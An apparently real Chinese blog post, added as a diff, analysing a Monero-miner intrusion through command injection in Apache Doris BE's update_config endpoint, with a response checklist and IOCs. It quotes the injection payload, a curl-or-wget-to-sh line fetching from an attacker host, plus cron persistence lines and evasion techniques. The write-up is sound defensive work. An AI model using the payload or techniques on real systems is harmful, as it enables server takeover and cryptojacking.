@@ -1,0 +1,871 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="piupiuxiupa">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Doris BE 的 &#x2F;api&#x2F;update_config 接口被利用进行命令注入，植入 XMRig 门罗币挖矿木马，导致两个 BE 节点 CPU 打满挂死。本文还原完整攻击链与样本行为，并给出可复用的应急排查流程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工">
+<meta property="og:url" content="https://piupiuxiupa.github.io/2026/10/22/doris-miner-incident/index.html">
+<meta property="og:site_name" content="piupiuxiupa&#39;s blog">
+<meta property="og:description" content="Doris BE 的 &#x2F;api&#x2F;update_config 接口被利用进行命令注入，植入 XMRig 门罗币挖矿木马，导致两个 BE 节点 CPU 打满挂死。本文还原完整攻击链与样本行为，并给出可复用的应急排查流程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-22T15:53:13.000Z">
+<meta property="article:modified_time" content="2026-10-23T03:11:27.219Z">
+<meta property="article:author" content="piupiuxiupa">
+<meta property="article:tag" content="security, linux, doris, incident-response">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工 - piupiuxiupa&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"piupiuxiupa.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>piupiuxiupa&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-10-22 23:53" pubdate>
+          2026年10月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一次门罗币挖矿病毒应急排查：从-Doris-BE-update-config-进来的矿工"><a href="#一次门罗币挖矿病毒应急排查：从-Doris-BE-update-config-进来的矿工" class="headerlink" title="一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工"></a>一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工</h1><h2 id="事件概述"><a href="#事件概述" class="headerlink" title="事件概述"></a>事件概述</h2><p>10 月 22 日中午发现异常：在此之前 Doris BE 节点 CPU 异常飙高，最终<strong>两台 BE 节点挂死、数据库连不上</strong>；尝试重启 BE 服务也起不来，排查发现有程序占用了 BE 服务端口。溯源确认这是一起门罗币（Monero &#x2F; XMRig 系）挖矿病毒入侵，入侵发生在<strong>前一天（10 月 21 日）下午</strong>，入口是暴露在公网的 Doris BE HTTP 管理接口。</p>
+<p>日志还原出的完整时间线：</p>
+<table>
+<thead>
+<tr>
+<th>时间（2026）</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10-21 13:28</td>
+<td>首次调用 <code>/api/update_config</code> 注入攻击载荷（本次日志最早的攻击记录，各节点时间略有差异）</td>
+</tr>
+<tr>
+<td>10-21 13:55</td>
+<td>恶意程序落地 <code>/var/lib/.systemd-private-3d94f1a0/</code>，13:55:54 状态转为 <code>mining</code></td>
+</tr>
+<tr>
+<td>10-21 17:25</td>
+<td>第二次注入（载荷标记 <code>cve50-1021</code>），17:38 建立第二个副本目录</td>
+</tr>
+<tr>
+<td>10-21 17:53</td>
+<td>该副本<strong>矿工二进制下载 15 分钟未成功</strong>，只留下 190KB 残片，状态 <code>failed</code></td>
+</tr>
+<tr>
+<td>10-21 19:10</td>
+<td>第三个副本目录就绪并开始挖矿</td>
+</tr>
+<tr>
+<td>10-21 19:33</td>
+<td>第三次注入（<code>doris-1022</code>）</td>
+</tr>
+<tr>
+<td>10-22 09:51</td>
+<td>第四次注入（<code>doris-1023</code>）——被处置前攻击者仍在持续尝试</td>
+</tr>
+<tr>
+<td>10-22 中午</td>
+<td>发现两台 BE 挂死、端口被占，开始应急处置</td>
+</tr>
+</tbody></table>
+<p>有意思的是，攻击载荷里带着 <code>TD_PROJ=doris-1021</code> 这样的项目标记——攻击者在用”项目名+日期”管理自己的攻击活动，这已经不是脚本小子的随机撒网，而是有一定工程化的持续作战。</p>
+<h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><h3 id="入口：update-config-jeprofile-dir-命令注入"><a href="#入口：update-config-jeprofile-dir-命令注入" class="headerlink" title="入口：update_config + jeprofile_dir 命令注入"></a>入口：update_config + jeprofile_dir 命令注入</h3><p>Doris BE 默认监听 <code>8040</code> 端口提供 HTTP 管理接口，其中 <code>/api/update_config</code> 在旧版本中<strong>无需任何认证</strong>。但本次攻击并不是”改个配置就拿下服务器”，而是一条更隐蔽的命令注入链：</p>
+<ol>
+<li><strong>设置恶意配置</strong>：调用 <code>/api/update_config?jeprofile_dir=&lt;载荷&gt;&amp;persist=false</code>，把内存分析工具（jeprofile）的输出目录 <code>jeprofile_dir</code> 设置成一段带 shell 元字符的字符串。</li>
+<li><strong>触发执行</strong>：当 BE 进行 heap profile dump 时，这个”目录”被拼进 dump 路径并交给 shell 处理——路径里的分号、括号被解释执行，注入的命令就这么跑起来了。BE 日志里留下了完整证据：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs log">I20261021 13:28:52 config_action.cpp:114] set_config jeprofile_dir=/tmp/.drsx83452; id; uname -m; (curl -fsSL -m90 &#x27;https://cdn.876553.xyz/Q1fc8a9OCb7AsC6f/dl/c9789d27-...&#x27; || wget -qO- &#x27;https://cdn.876553.xyz/...&#x27;) | TD_PROJ=doris-1021 sh &gt;/dev/null 2&gt;&amp;1 &amp; :; rm -rf /tmp/.drsx83452* 2&gt;/dev/null; success. persist: 0<br>I20261021 13:29:19 heap_profiler.cpp:57] dump heap profile to /tmp/.drsx83452; id; uname -m; (curl ...) ... /jeheap_dump.1792560559.heap<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>载荷行为</strong>：<code>id; uname -m</code> 摸底系统环境 → <code>curl | sh</code> 异步拉取下一阶段脚本（<code>&gt;/dev/null 2&gt;&amp;1</code> 全程静默）→ <code>rm -rf /tmp/.drsx*</code> 清理落地痕迹。整个载荷从配置注入到自清理一气呵成。</li>
+</ol>
+<h3 id="落地：伪装成-systemd-私有目录"><a href="#落地：伪装成-systemd-私有目录" class="headerlink" title="落地：伪装成 systemd 私有目录"></a>落地：伪装成 systemd 私有目录</h3><p>攻击脚本在 <code>/var/lib/</code> 下创建形如 <code>.systemd-private-3d94f1a0/</code> 的目录——模仿 systemd 私有临时目录的命名（正常系统里 <code>/tmp/systemd-private-*</code> 很常见，藏进 <code>/var/lib</code> 再加个点前缀，<code>ls</code> 默认都看不见），这是 Linux 挖矿木马的典型藏匿手法。本次共发现三个副本目录：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>实际角色</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>systemd-resolved-helper</code></td>
+<td>改名伪装的 <strong>XMRig 矿工</strong>（x86-64 静态编译 ELF，8.35MB，stripped；字符串中可见 RandomX、monero、donate-level 等 XMRig 特征）。<code>7b072e55</code> 目录里那份 190KB 的是下载中断的残片</td>
+</tr>
+<tr>
+<td><code>.nm-inst.sh</code> &#x2F; <code>.nm-dog.sh</code></td>
+<td>安装器 &#x2F; 看门狗脚本（内容几乎相同，仅路径不同；安装完成会把 inst 改名为 dog）</td>
+</tr>
+<tr>
+<td><code>.nm.conf</code></td>
+<td>XMRig 配置：三个矿池 + 两个钱包地址，75% 线程挖矿，donate-level 1%</td>
+</tr>
+<tr>
+<td><code>.nm-state</code></td>
+<td>运行状态机，记录 <code>installing</code> &#x2F; <code>mining</code> &#x2F; <code>failed</code> 及时间戳</td>
+</tr>
+</tbody></table>
+<h3 id="样本行为：一个”敬业”的看门狗脚本"><a href="#样本行为：一个”敬业”的看门狗脚本" class="headerlink" title="样本行为：一个”敬业”的看门狗脚本"></a>样本行为：一个”敬业”的看门狗脚本</h3><p>读完 <code>.nm-inst.sh</code>（约 6KB），不得不承认这个脚本写得相当工程化：</p>
+<ol>
+<li><strong>自我脱离</strong>：<code>setsid</code> 脱离终端后台运行，不依赖任何父进程</li>
+<li><strong>排除同行</strong>：扫描 <code>/proc/*/cmdline</code>，先 <code>kill -9</code> 掉其他挖矿程序（<code>kworker/u8</code>、同类 <code>systemd-resolved-helper</code>），独占 CPU</li>
+<li><strong>可靠的下载循环</strong>：校验二进制大小必须是 8350992&#x2F;8351120 字节，<code>curl</code> 失败换 <code>wget</code>、断点续传，最多重试 15 分钟，超时写 <code>failed</code> 状态退出（本次就有一份副本真的失败了）</li>
+<li><strong>哈希扰动</strong>：下载完成后往文件尾部追加 128 字节随机数据——<strong>每个落地副本的 sha256 都不同</strong>，专门逃避基于哈希&#x2F;特征码的查杀</li>
+<li><strong>时间戳伪造</strong>：<code>touch -r /usr/sbin/sshd</code> 把文件 mtime 伪装成 sshd 的时间（本例中被伪装成 2020-02-05）</li>
+<li><strong>cron 持久化</strong>：root 权限写 <code>/etc/cron.d/0hourly-sysstat</code>（伪装成 sysstat 监控工具的定时任务），非 root 则写入用户 crontab。解码其 base64 内容后一目了然：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cron">*/7 * * * * root grep -l -e &#x27;kworker/u[8]&#x27; -e &#x27;systemd-resolved-helper&#x27; /proc/[0-9]*/cmdline ... || sh /var/lib/.systemd-private-xxx/.nm-dog.sh ...<br>@reboot root sleep 30; sh /var/lib/.systemd-private-xxx/.nm-dog.sh ...<br></code></pre></td></tr></table></figure>
+
+<p>每 7 分钟检查一次矿工进程，死了就拉起；开机 30 秒后自启。</p>
+<ol start="7">
+<li><strong>五级启动 fallback + 进程伪装</strong>：依次尝试 <code>python3 prctl(PR_SET_NAME)</code> 改名 → <code>bash exec -a</code> 改名 → <code>memfd_create</code> <strong>无文件内存执行</strong> → <code>ld.so --argv0</code> 改名 → 裸跑，全部把进程名伪装成内核线程 **<code>[kworker/u8:2]</code>**。在 <code>ps</code> 里它看起来就像一个人畜无害的内核工作线程</li>
+<li><strong>自杀保护</strong>：把矿工进程的 <code>oom_score_adj</code> 设为 1000——服务器内存紧张时 OOM killer 会<strong>优先杀掉矿工自己</strong>而不是业务进程。表面上是”贴心”地不影响业务，本质是避免因业务异常暴露自己的存在</li>
+</ol>
+<h2 id="通用应急排查流程"><a href="#通用应急排查流程" class="headerlink" title="通用应急排查流程"></a>通用应急排查流程</h2><p>本次事件的处理思路整理成通用流程，分六步：<strong>止血 → 定位进程 → 排查持久化 → 溯源 → 清除 → 加固</strong>。核心原则：先保业务、别打草惊蛇、清除顺序不能错。</p>
+<h3 id="1-止血（先保业务）"><a href="#1-止血（先保业务）" class="headerlink" title="1. 止血（先保业务）"></a>1. 止血（先保业务）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 封锁入口：只允许内网访问 Doris 各管理端口</span><br><span class="hljs-comment"># 8030 FE http / 8040 BE http / 9030 FE MySQL协议</span><br>iptables -A INPUT -p tcp --dport 8040 ! -s 10.0.0.0/8 -j DROP<br></code></pre></td></tr></table></figure>
+
+<p>或直接在云安全组配置白名单。本次处置中，攻击者在 22 日上午仍在持续注入——<strong>入口不封，清完还会再来</strong>。</p>
+<blockquote>
+<p>⚠️ 不要急着杀挖矿进程。看门狗（本例为 7 分钟一次的 cron）会立刻拉起，而且部分样本被干扰后会切换文件名和路径，增加排查难度。先摸清持久化，再统一清除。</p>
+</blockquote>
+<h3 id="2-定位挖矿进程"><a href="#2-定位挖矿进程" class="headerlink" title="2. 定位挖矿进程"></a>2. 定位挖矿进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -15      <span class="hljs-comment"># CPU 排名，矿工常年霸榜</span><br><span class="hljs-built_in">ls</span> -l /proc/&lt;PID&gt;/exe               <span class="hljs-comment"># 看进程真实路径——伪装名的照妖镜</span><br><span class="hljs-built_in">cat</span> /proc/&lt;PID&gt;/cmdline<br>lsof -p &lt;PID&gt;                       <span class="hljs-comment"># 打开的文件</span><br>ss -tnp | grep &lt;PID&gt;                <span class="hljs-comment"># 对外连接</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>典型特征：</strong></p>
+<ul>
+<li>CPU 长期 90%~100%，多核打满</li>
+<li>进程路径在 <code>/tmp</code>、<code>/dev/shm</code>、<code>/var/tmp</code>、<code>/var/lib/.xxx</code> 等隐蔽目录</li>
+<li>进程名伪装：本次是 <code>[kworker/u8:2]</code>（假装内核线程）和 <code>systemd-resolved-helper</code>（假装系统服务）；其他家族常见 <code>kdevtmpfsi</code>、<code>kinsing</code>、<code>xmrig</code>、随机字符串</li>
+<li>对外连接矿池端口：3333、4444、5555、7777、14444 等</li>
+</ul>
+<p><strong>鉴别伪装进程的关键</strong>：<code>ps</code> 里看到 <code>[kworker/u8:2]</code> 不要慌（内核线程正常存在），但真正的内核线程其 <code>/proc/&lt;PID&gt;/exe</code> 为空或指向内核；如果<strong>括号进程名的 exe 指向 <code>/var/lib</code> 下的用户态文件</strong>，立刻锁定。本例中 <code>top</code> 里它是”内核线程”，<code>ls -l /proc/&lt;PID&gt;/exe</code> 直接现形。</p>
+<p>另检查动态链接器劫持（本例未使用，但属常见手法）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/ld.so.preload    <span class="hljs-comment"># 正常不存在或为空；非空 = libprocesshider 类隐藏</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-排查持久化（复活机制）"><a href="#3-排查持久化（复活机制）" class="headerlink" title="3. 排查持久化（复活机制）"></a>3. 排查持久化（复活机制）</h3><p>清除成败的关键——把守护机制全找出来，否则杀进程等于白杀。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 计划任务（重点！注意名字伪装成正常工具的 cron 文件）</span><br>crontab -l<br><span class="hljs-built_in">ls</span> -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/<br><span class="hljs-comment"># 本次的伪装文件：/etc/cron.d/0hourly-sysstat（冒充 sysstat）</span><br><span class="hljs-comment"># cron 内容若为 base64，先解码再看：echo &#x27;&lt;串&gt;&#x27; | base64 -d</span><br><br><span class="hljs-comment"># systemd 定时器和服务</span><br>systemctl list-timers --all<br>systemctl list-units --<span class="hljs-built_in">type</span>=service --state=running<br><span class="hljs-built_in">ls</span> -lt /etc/systemd/system/ /usr/lib/systemd/system/ | <span class="hljs-built_in">head</span><br><br><span class="hljs-comment"># SSH 后门公钥</span><br><span class="hljs-built_in">cat</span> /root/.ssh/authorized_keys<br><span class="hljs-built_in">ls</span> -la /home/*/.ssh/<br><br><span class="hljs-comment"># 新增账号 / 异常用户</span><br><span class="hljs-built_in">cat</span> /etc/passwd | grep -E <span class="hljs-string">&#x27;sh$&#x27;</span><br>awk -F: <span class="hljs-string">&#x27;$3==0&#x27;</span> /etc/passwd      <span class="hljs-comment"># uid=0 的非 root 账号</span><br><br><span class="hljs-comment"># 内核级 rootkit（可选深度检查）</span><br>rkhunter --check<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 恶意文件常被 <code>chattr +i</code> 锁定导致删不掉，先 <code>chattr -ia &lt;file&gt;</code> 解锁；<code>lsattr /etc/passwd /etc/shadow /etc/cron.d/*</code> 一并检查。</p>
+</blockquote>
+<h3 id="4-溯源（怎么进来的）"><a href="#4-溯源（怎么进来的）" class="headerlink" title="4. 溯源（怎么进来的）"></a>4. 溯源（怎么进来的）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">last; lastb                          <span class="hljs-comment"># 登录记录</span><br><span class="hljs-built_in">history</span>; <span class="hljs-built_in">cat</span> /root/.bash_history     <span class="hljs-comment"># 历史命令</span><br>find /tmp /var/tmp /dev/shm -mtime -3 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; \;<br></code></pre></td></tr></table></figure>
+
+<p><strong>针对中间件&#x2F;数据库类入侵，组件日志往往是最直接的证据</strong>。本次就是从 Doris 的 <code>be.INFO</code> 日志里检索到全部 4 次攻击注入记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -rE <span class="hljs-string">&quot;update_config|jeprofile_dir&quot;</span> &lt;be_log_dir&gt;/<br></code></pre></td></tr></table></figure>
+
+<p>日志里能拿到：攻击时间、注入参数、<code>TD_PROJ</code> 活动标记、后续 dump 触发记录——足以还原完整时间线。</p>
+<h3 id="5-清除（顺序很重要）"><a href="#5-清除（顺序很重要）" class="headerlink" title="5. 清除（顺序很重要）"></a>5. 清除（顺序很重要）</h3><ol>
+<li><strong>先拆守护，再杀矿工</strong>：停用&#x2F;删除 cron 与 systemd 守护（本例：<code>rm /etc/cron.d/0hourly-sysstat</code>），再杀进程，用 <code>pstree -p</code> 看清父子链</li>
+<li>删除恶意文件（先 <code>chattr -ia</code> 解锁）：<code>/var/lib/.systemd-private-*/</code> 整目录、<code>/tmp/.drsx*</code> 残留</li>
+<li>清理其余持久化点位：<code>authorized_keys</code> 后门公钥、<code>ld.so.preload</code>、恶意服务</li>
+<li><strong>改遍所有凭据</strong>：SSH、数据库、API token、云密钥——攻击者能执行任意命令，应假定凭据已泄露</li>
+<li><strong>重启验证</strong>：清理后重启，观察 CPU、对外连接、cron 是否复发。复发说明还有漏网守护</li>
+</ol>
+<h3 id="6-加固（针对本次入口）"><a href="#6-加固（针对本次入口）" class="headerlink" title="6. 加固（针对本次入口）"></a>6. 加固（针对本次入口）</h3><p><strong>Doris 层面：</strong></p>
+<ul>
+<li>升级到已修复版本：新版对配置接口增加了认证&#x2F;校验</li>
+<li>FE&#x2F;BE 所有管理端口（8030&#x2F;8040&#x2F;9030 及 web UI）<strong>一律不暴露公网</strong>，安全组白名单只放运维网段</li>
+<li><code>jeprofile</code> 等调试类配置非必要不开启</li>
+</ul>
+<p><strong>主机层面：</strong></p>
+<ul>
+<li>SSH 禁用密码登录改用密钥，禁 root 直接登录</li>
+<li>fail2ban &#x2F; 安全组限制 SSH 来源</li>
+<li>安装主机安全 agent（HIDS），对 <code>cron.d</code> 变更、异常进程名等配置告警</li>
+</ul>
+<h2 id="IOC-指标（Indicators-of-Compromise）"><a href="#IOC-指标（Indicators-of-Compromise）" class="headerlink" title="IOC 指标（Indicators of Compromise）"></a>IOC 指标（Indicators of Compromise）</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>入口 URL</td>
+<td><code>/api/update_config?jeprofile_dir=...</code>（含命令注入载荷）</td>
+</tr>
+<tr>
+<td>下载域名</td>
+<td><code>cdn.876553.xyz</code></td>
+</tr>
+<tr>
+<td>落地目录</td>
+<td><code>/var/lib/.systemd-private-*/</code>（<code>.nm-inst.sh</code> <code>.nm-dog.sh</code> <code>.nm.conf</code> <code>.nm-state</code>）</td>
+</tr>
+<tr>
+<td>矿工文件</td>
+<td><code>systemd-resolved-helper</code>（8351120 字节 &#x3D; 8350992 + 128 随机尾字节）</td>
+</tr>
+<tr>
+<td>伪装进程名</td>
+<td><code>[kworker/u8:2]</code>、<code>systemd-resolved-helper</code></td>
+</tr>
+<tr>
+<td>持久化文件</td>
+<td><code>/etc/cron.d/0hourly-sysstat</code>（*&#x2F;7 分钟拉活 + @reboot 自启）</td>
+</tr>
+<tr>
+<td>中间产物</td>
+<td><code>/tmp/.drsx*</code>、<code>/tmp/.nm.cron</code></td>
+</tr>
+<tr>
+<td>矿池</td>
+<td><code>139.99.69.109:443</code>、<code>gulf.moneroocean.stream:443</code>、<code>106.55.151.217:3333</code></td>
+</tr>
+<tr>
+<td>钱包</td>
+<td><code>49hM2EPoSp94KEYpN6SdR5gWASZZXbQ8sT1Pthdk1AnXLMFkzZHUUSeYwQCL5vZcJxMdV72DcwaDD2e71qnitukfSqy8pcP</code></td>
+</tr>
+<tr>
+<td>载荷标记</td>
+<td><code>TD_PROJ=doris-1021</code> &#x2F; <code>cve50-1021</code> &#x2F; <code>doris-1022</code> &#x2F; <code>doris-1023</code></td>
+</tr>
+<tr>
+<td>样本 sha256</td>
+<td><code>bda36d92056a55a62fd46b2e63bc8266fa9105bed43067a15638d6742c23bdde</code><br><code>fcff861a6d77ec532a63645512818b87e73498883e04723aa510ceddcaf6bd38</code><br><code>fa80a387cb00bee0937c9f26b8c0c3060d55b8f5b0103a7903d180098d47df5c</code>（残片）</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol>
+<li><strong>大数据组件的管理端口暴露公网 &#x3D; 交出服务器</strong>，没有例外。本次攻击者 21 小时内注入 4 次，入口不封，清理永无止境</li>
+<li>配置接口也可能成为命令注入点——<code>update_config</code> 本身只是改参数，但参数值最终进了 shell 就变成了 RCE。审计中间件时不要只看”有没有认证”，还要看”配置值流向哪里”</li>
+<li>清除挖矿病毒的核心不是杀进程，而是<strong>先拆干净守护机制</strong>（本例：7 分钟粒度的 cron 看门狗）</li>
+<li>这个家族的反排查手法值得记住：进程名伪装成内核线程、cron 文件伪装成 sysstat、时间戳伪造、每副本哈希扰动、OOM 自杀保护。识别它靠的不是杀软，而是 <code>ls -l /proc/&lt;PID&gt;/exe</code> 这类朴素手段</li>
+<li>应急结束的标准：重启后无复发 + 所有凭据已轮换 + 入口永久关闭</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Posts/" class="category-chain-item">Posts</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security-linux-doris-incident-response/" class="print-no-link">#security, linux, doris, incident-response</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
